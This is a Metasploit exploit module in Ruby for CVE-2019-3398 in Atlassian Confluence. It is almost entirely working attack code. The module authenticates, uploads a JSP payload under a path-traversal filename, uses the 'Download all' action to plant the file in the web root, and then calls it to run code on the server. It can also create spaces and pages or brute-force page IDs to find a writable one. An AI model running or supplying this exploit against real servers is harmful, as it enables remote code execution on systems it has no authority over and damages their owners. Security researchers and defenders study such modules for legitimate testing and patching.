# Vendor Homepage: https://www.atlassian.com
# Software Link: https://www.atlassian.com/software/confluence/download-archives
# Version: 6.15.1
# Tested on: Microsoft Windows 7 Enterprise, 6.1.7601 Service Pack 1 Build 7601, Linux 5.0.0-23-generic #24~18.04.1-Ubuntu
# CVE : N/A
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

include Msf::Exploit::Remote::HttpClient

def initialize(info={})
	super(update_info(info,
	&#039;Name&#039;			=> "Confluence Arbitrary File Write via Path Traversal (CVE-2019-3398)",
	&#039;Description&#039;		=> %q{
	To use this exploit you should specify the following variables:
	USERNAME and PASSWORD - the login/password to log into the web interface of the Atlassian Confluence server.
	ROOTFOLDER - the root directory of the web server. If the root directory is located in C:\confluence\pages\, set this variable to ROOTFOLDER = &#039;confluence/pages/&#039;.
	Typical ROOTFOLDER locations are:
	Windows: Program Files/Atlassian/Confluence/confluence/pages/
	Linux: opt/atlassian/confluence/confluence/pages/
	Note that the root directory of the web server and the temporary directory of the Atlassian Confluence server on Windows must be on the same drive (C:\ in the example above).
	PAGEID - the pageId URL parameter you see in the browser address bar when you vist the Atlassian Confluence page where you have rights to upload files.
	For example, https://server.net/pages/viewpageattachments.action?pageId=111111111&metadataLink=true.
	If PAGEID is set to 0, the script will try to create a new Page ID. If it fails, it will try to create a new space and create a Page ID there.
	If PAGEID is not specified, the script will walk though the PAGEID_RANGE_START..PAGEID_RANGE_END range.
	The script gets authenticated to the Atlassian Confluence server, retrieves the ATLASSIAN TOKEN from the server response, uploads the shellcode, then imitates the &#039;Download all&#039; action to place the shellcode to the root directory of the web server.
	Tested on Atlassian v6.15.1. on Linux and Windows.
	Note that on Linux Confluence runs under the &#039;confluence&#039; account which may not have rights to save files in the root directory of the web server. In this case the exploit will fail. Also, to create a new space and get the list of existing spaces the script makes use of Confluence REST API, which is available starting from Confluence Server 5.5.
	},
	&#039;License&#039;			=> MSF_LICENSE,
	&#039;Author&#039;			=>
	[
		&#039;Maxim Guslyaev&#039;      # Metasploit module
	],
	&#039;References&#039;		=>
	[
		[ &#039;CVE&#039;, &#039;2019-3398&#039; ],
		[ &#039;URL&#039;, &#039;https://confluence.atlassian.com/doc/confluence-security-advisory-2019-04-17-968660855.html&#039; ],
		[ &#039;URL&#039;, &#039;https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181&#039;],
		[ &#039;URL&#039;, &#039;https://nvd.nist.gov/vuln/detail/CVE-2019-3398&#039;]
	],
	&#039;Privileged&#039;		=> false,
	&#039;Platform&#039;		=> %w{ linux win },
	&#039;Targets&#039;			=>
	[
		[ &#039;Windows&#039;, { &#039;Platform&#039; => &#039;win&#039;,   &#039;Arch&#039; => ARCH_JAVA  }],
		[ &#039;Linux&#039;,   { &#039;Platform&#039; => &#039;linux&#039;, &#039;Arch&#039; => ARCH_JAVA  }]
	],
	&#039;DefaultOptions&#039;	=>
	{
		&#039;RPORT&#039; => 8090,
		&#039;SSL&#039; => false
	},
	&#039;DisclosureDate&#039; => &#039;Nov 9 2019&#039;,
	&#039;DefaultTarget&#039;  => 0
	))

	register_options(
	[
		OptString.new(&#039;USERNAME&#039;, [true, &#039;The login to log into the web interface of the Atlassian Confluence server&#039;, &#039;test&#039;]),        
		OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to log into the web interface of the Atlassian Confluence server&#039;, &#039;test&#039;]),
		OptString.new(&#039;ROOTFOLDER&#039;, [true, &#039;The root folder of the Atlassian Confluence server&#039;, &#039;Program Files/Atlassian/Confluence/confluence/pages/&#039;]),
		#OptString.new(&#039;ROOTFOLDER&#039;, [true, &#039;The root folder of the Atlassian Confluence server&#039;, &#039;opt/atlassian/confluence/confluence/pages/&#039;]),
		OptString.new(&#039;FILENAME&#039;, [true, &#039;The JSP shellcode file name&#039;, &#039;covfefe.jsp&#039;]),
		OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base to Confluence&#039;, &#039;/&#039;]),
		OptString.new(&#039;NEWSPACE&#039;, [false, &#039;A new space to be created&#039;, &#039;TESTSPACE432545645&#039;]),
		OptInt.new(&#039;PAGEID&#039;, [false, &#039;A Page ID to be used to upload shellcode&#039;, 0]),
		OptInt.new(&#039;PAGEID_RANGE_START&#039;, [false, &#039;The first Page ID to be used to enumerate a writable Page ID (used when PAGEID is not specified)&#039;, &#039;1&#039;]),
		OptInt.new(&#039;PAGEID_RANGE_END&#039;, [false, &#039;The last Page ID to be used to enumerate a writable Page ID (used when PAGEID is not specified)&#039;, &#039;999999999&#039;]),
		
	], self.class)
end

def do_authenticate
	print_status("Sending POST request to the web application (authentication)...")
	res = send_request_cgi({
		&#039;uri&#039;              => normalize_uri(target_uri.path.to_s, &#039;/dologin.action&#039;),
		&#039;method&#039;           => &#039;POST&#039;,
		&#039;vars_post&#039;        => {
		&#039;os_username&#039;    => datastore[&#039;USERNAME&#039;],
		&#039;os_password&#039;    => datastore[&#039;PASSWORD&#039;],
		&#039;os_destination&#039; => &#039;&#039;,
		&#039;login&#039;          => &#039;Log+In&#039;
					}
			})
	if res.nil?
		print_status("Unable to access the web application!")
		return 0
	end
	@sessid = get_sid(res)
	if @sessid.nil?
		print_status("Unable to retrieve session ID!")
		return 0
	end
	print_status("Getting Session ID from the web application... #{@sessid}")
	
	if res && res.redirect?
		location = res.redirection
		if location.nil?
			print_status("Unable to access the web application when redirected!")
			return 0
		end
		res = send_request_cgi!({
		&#039;uri&#039;              => normalize_uri(target_uri.path.to_s, location.to_s),
		&#039;method&#039;           => &#039;GET&#039;,
		&#039;headers&#039;       => {
		&#039;Cookie&#039;           => @sessid
					}
			}, redirect_depth = 5)
	end

	if res && res.code == 200
		if res.body =~ /re-enter\syour\slogin/ || res.body =~ /Sorry,\syour\susername\sand\/or\spassword\sare\sincorrect/ || res.body =~ /Unauthorized/
			print_status("Authentication failed...")
			return 0
		end

		@xsrf_token = res.get_html_document.at(&#039;meta[@id="atlassian-token"]&#039;)[&#039;content&#039;]
		if @xsrf_token.nil? or @xsrf_token.blank?
			print_status("Failed to retrieve XSRF token...")
			return 0
		else
			print_status("Retrieving XSRF token... #{@xsrf_token}")
			return 1
		end
	else
		print_status("Unexpected response from the web application...")
		return 0
	end
end

def do_upload(_pageid)
	print_status("Sending POST request to the web application (shellcode upload)...")
	res = send_request_cgi({
		&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/plugins/drag-and-drop/upload.action&#039;),
		&#039;method&#039;		=> &#039;POST&#039;,
		&#039;vars_get&#039;		=> {
		&#039;pageId&#039;		=> _pageid,
		&#039;filename&#039;		=> &#039;../../../../../../../../../../&#039; + datastore[&#039;ROOTFOLDER&#039;] + datastore[&#039;FILENAME&#039;],
		&#039;size&#039;			=> payload.encoded.length,
		&#039;mimeType&#039;		=> &#039;text/plain&#039;,
		&#039;spaceKey&#039;		=> &#039;isis&#039;,
		&#039;atl_token&#039;		=> @xsrf_token,
		&#039;name&#039;			=> datastore[&#039;FILENAME&#039;]
		},
		&#039;data&#039;			=> payload.encoded,
		&#039;headers&#039;		=> {
          	&#039;Connection&#039;		=> &#039;close&#039;,
		&#039;Accept&#039;		=> &#039;*/*&#039;,
		&#039;Accept-Encoding&#039;	=> &#039;identity&#039;,
          	&#039;Cookie&#039;		=> @sessid,
		&#039;Content-Length&#039;	=> payload.encoded.length,
		&#039;Content-Type&#039;		=> &#039;text/plain&#039;
		}
		})
	if res && res.code == 200 && res.body.scan(/actionErrors/).blank?
		print_status("Shellcode uploaded...")
		return 1
	else
		return 0
	end
end

def do_downloadall(_pageid)
	for downloadall_iter in 1..10
		print_status("Sending GET request to the web application (downloadall)...")
		res = send_request_cgi({
			&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/pages/downloadallattachments.action&#039;),
			&#039;method&#039;		=> &#039;GET&#039;,
			&#039;vars_get&#039;		=> {
			&#039;pageId&#039;		=> _pageid
			},
			&#039;headers&#039;		=> {
          		&#039;Cookie&#039;		=> @sessid
			}
			})
		
		print_status("Sending GET request to the web application (shellcode invokation)...")
		res = send_request_cgi({
			&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/pages/&#039; + datastore[&#039;FILENAME&#039;]),
			&#039;method&#039;		=> &#039;GET&#039;,
			&#039;headers&#039;		=> {
          		&#039;Cookie&#039;		=> @sessid
			}
			}, timeout = 10)

		if res && res.code == 200
			print_status("Shellcode found...")
			return 1
		else
			if downloadall_iter == 10
				print_status("Shellcode not found...")
				return 0
			end
		end
	end
end

def do_getspaces
	print_status("Sending GET request to the web application (getting available spaces)...")
		res = send_request_cgi({
			&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/rest/api/space&#039;),
			&#039;method&#039;		=> &#039;GET&#039;,
			&#039;headers&#039;		=> {
			&#039;User-Agent&#039;		=> &#039;python-requests/2.20.0&#039;,
        		&#039;Cookie&#039;		=> @sessid,
			&#039;Accept&#039;		=> &#039;*/*&#039;,
			&#039;Accept-Encoding&#039;	=> &#039;identity&#039;,
			&#039;Content-Type&#039;		=> &#039;application/json&#039;
			}
			})

		if res && res.code == 200 && res.body =~ /results/
			space_list = res.body.scan(/\"key\":\"(\w+)\"/).flatten
		else
			space_list = Array([])
		end
	return space_list
end

def do_createspace
	print_status("Sending POST request to the web application (creating a space)...")
	res = send_request_cgi({
	&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/rest/api/space&#039;),
	&#039;method&#039;		=> &#039;POST&#039;,
	&#039;data&#039;			=> {
		"key": datastore[&#039;NEWSPACE&#039;],
		"name": "Example space",
		"description": {
		"plain": {
		"value": "This is an example space",
		}
		},
		"metadata": {}
		}.to_json,
	&#039;headers&#039;		=> {
	&#039;User-Agent&#039;		=> &#039;python-requests/2.20.0&#039;,
        &#039;Cookie&#039;		=> @sessid,
	&#039;Accept-Encoding&#039;	=> &#039;identity&#039;,
	&#039;Content-Type&#039;		=> &#039;application/json&#039;
	}
	})

	if res && res.code == 200 && res.body =~ /\"key\":\"\w+\"/
		print_status("Space created...")
		return res.body.scan(/\"key\":\"(\w+)\"/).flatten[0]
	else
		print_status("Space not created...")
		return 0
	end			
end

def do_createpage(_space)
	print_status("Sending GET request to the web application (creating Page ID), space #{_space}...")
	res = send_request_cgi({
		&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/pages/createpage.action?spaceKey=&#039;+_space),
		&#039;method&#039;		=> &#039;GET&#039;,
		&#039;headers&#039;		=> {
        	&#039;Cookie&#039;		=> @sessid
		}
		})
	if res && res.code == 200 && res.body =~ /ajs-draft-id/
		pageid = res.get_html_document.at(&#039;meta[@name="ajs-draft-id"]&#039;)[&#039;content&#039;]
		pageid_parsed = /(\d+)/.match(pageid)
		if pageid_parsed.nil?
			print_status("Unexpected Page ID format...")
			return 0
		else
			print_status("Page ID created... #{pageid}")
			datastore[&#039;PAGEID&#039;] = pageid
			return 1
		end
	else
		return 0
	end
end

def get_sid(res)
	if res.nil?
		return &#039;&#039;
	end
	res.get_cookies.scan(/(JSESSIONID=\w+);*/).flatten[0] || &#039;&#039;
end


def exploit
	print_status("Getting authenticated to the web application...")
	if do_authenticate != 1
		fail_with(Failure::Unknown, &#039;Initial access or authentication error!&#039;)
	end
	
	unless datastore[&#039;PAGEID&#039;].blank?
		if datastore[&#039;PAGEID&#039;] == 0
			print_status("Creating Page ID...")
			spaces = do_getspaces
			for sp in spaces
				if do_createpage(sp) == 1
					print_status("Uploading shellcode...")
					if do_upload(datastore[&#039;PAGEID&#039;]) != 1
						print_status("Failed to upload shellcode...")
						next
					end					
					print_status("Invoking shellcode...")
					if do_downloadall(datastore[&#039;PAGEID&#039;]) != 1
						print_status("Failed to invoke shellcode...")
						next
					else
						return
					end
				end
			end

			print_status("Trying to create a new space...")
			new_sp = do_createspace

			if new_sp != 0
				if do_createpage(new_sp) == 1
					print_status("Uploading shellcode...")
					if do_upload(datastore[&#039;PAGEID&#039;]) != 1
						fail_with(Failure::Unknown, &#039;Error while uploading shellcode!&#039;)
					end
					print_status("Invoking shellcode...")
					if do_downloadall(datastore[&#039;PAGEID&#039;]) != 1
						fail_with(Failure::Unknown, &#039;Error while invoking shellcode!&#039;)				
					end

					return
				else
					fail_with(Failure::Unknown, &#039;Error while creating page in the newly created space!&#039;)
				end
			else
				fail_with(Failure::Unknown, &#039;Error while creating space!&#039;)
			end
		end	
			
		print_status("Uploading shellcode...")
		if do_upload(datastore[&#039;PAGEID&#039;]) != 1
			fail_with(Failure::Unknown, &#039;Error while uploading shellcode!&#039;)
		end
		print_status("Invoking shellcode...")
		if do_downloadall(datastore[&#039;PAGEID&#039;]) != 1
			fail_with(Failure::Unknown, &#039;Error while invoking shellcode!&#039;)				
		end
	else
		for id in datastore[&#039;PAGEID_RANGE_START&#039;]..datastore[&#039;PAGEID_RANGE_END&#039;]
			print_status("Trying Page Id #{id}")
			print_status("Uploading shellcode...")
			if do_upload(id) == 1
				print_status("Invoking shellcode...")
				if do_downloadall(id) == 1
					break
				end
			end
		end
	end

end

def check
	res = send_request_cgi!({
		&#039;uri&#039;			=> normalize_uri(target_uri.path.to_s, &#039;/login.action?anon=1&logout=1&#039;),
		&#039;method&#039;		=> &#039;GET&#039;,
		}, redirect_depth = 5)

	if res && res.body =~ /Powered\sby/
		ver = res.body.scan(/^.*Powered\sby\s.*(\d{1,}\.\d{1,}\.\d{1,}).*$/).flatten[0]
		print_status("The version of the web application is #{ver}")
		ver_parsed = /(\d+)\.(\d+)\.(\d+)/.match(ver.to_s)
		if ver_parsed.nil?
			print_status("The version of the web application couldn&#039;t be parsed")
			return Exploit::CheckCode::Detected
		end
		ver_oct1 = ver_parsed[1].to_i
		ver_oct2 = ver_parsed[2].to_i
		ver_oct3 = ver_parsed[3].to_i
		
		if ver_oct1.between?(2, 6) && ver_oct2.between?(0, 6) && ver_oct3.between?(0, 12) || ver_oct1.between?(6, 6) && ver_oct2.between?(7, 12) && ver_oct3.between?(0, 3) || ver_oct1.between?(6, 6) && ver_oct2.between?(13, 13) && ver_oct3.between?(0, 3) || ver_oct1.between?(6, 6) && ver_oct2.between?(14, 14) && ver_oct3.between?(0, 2) || ver_oct1.between?(6, 6) && ver_oct2.between?(15, 15) && ver_oct3.between?(0, 1)
			return Exploit::CheckCode::Appears
		else
			return Exploit::CheckCode::Safe		
		end

	else
		return Exploit::CheckCode::Unknown
	end
end

end

